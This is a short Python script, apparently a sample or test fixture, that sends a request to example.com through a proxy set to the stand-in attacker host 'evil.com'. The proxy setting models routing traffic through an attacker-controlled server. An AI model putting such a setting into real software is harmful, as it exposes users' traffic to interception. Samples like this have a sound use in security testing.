import requests

proxy = {"http": "http://evil.com"}

def main():
    requests.get(
        "https://example.com",
        proxies=proxy
    )

main()